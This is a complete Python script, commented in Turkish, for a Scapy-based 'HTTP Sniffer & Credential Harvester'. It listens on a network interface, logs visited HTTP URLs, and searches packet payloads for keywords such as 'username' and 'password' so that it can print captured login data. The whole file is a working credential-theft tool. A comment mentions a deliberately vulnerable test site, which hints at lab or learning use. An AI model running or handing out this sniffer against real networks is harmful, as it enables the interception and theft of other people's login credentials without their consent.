import scapy.all as scapy
from scapy.layers import http # HTTP katmanını tanımak için
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="HTTP Sniffer & Credential Harvester")
    parser.add_argument("-i", "--interface", dest="interface", help="Dinlenecek Arayüz (örn: eth0, wlan0)", required=True)
    return parser.parse_args()

def get_url(packet):
    """Paketin içinden girilen Web Sitesi adresini (URL) çeker."""
    # Host: testphp.vulnweb.com
    # Path: /login.php
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    """Eğer pakette kullanıcı adı/şifre varsa onu çeker."""
    if packet.haslayer(scapy.Raw):
        # 'load' kısmı verinin (payload) olduğu yerdir
        load = packet[scapy.Raw].load.decode(errors="ignore")
        
        # Genellikle login işlemlerinde geçen anahtar kelimeler
        keywords = ["username", "user", "login", "password", "pass", "email", "uname"]
        
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_packet(packet):
    """Her paket yakalandığında bu fonksiyon çalışır."""
    
    # Sadece HTTP İSTEKLERİNE bak (Resimler, CSS dosyaları vs. değil)
    if packet.haslayer(http.HTTPRequest):
        # 1. URL'i Yakala ve Yazdır
        try:
            url = get_url(packet)
            print(f"[+] HTTP İsteği > {url}")
        except:
            pass

        # 2. Şifre/Kullanıcı Adı Var mı Bak
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n" + "-"*60)
            print(f"[!!!] MÜMKÜN ŞİFRE YAKALANDI: {login_info}")
            print("-"*60 + "\n\n")

def sniff(interface):
    print(f"[*] {interface} arayüzü üzerinde HTTP trafiği dinleniyor...")
    # store=False -> Paketleri RAM'de tutma (Bilgisayar kasmasın)
    # prn=process_packet -> Her paket geldiğinde bu fonksiyonu çağır
    scapy.sniff(iface=interface, store=False, prn=process_packet)

# --- ANA PROGRAM ---
options = get_arguments()
try:
    sniff(options.interface)
except KeyboardInterrupt:
    print("\n[!] Dinleyici kapatıldı.")
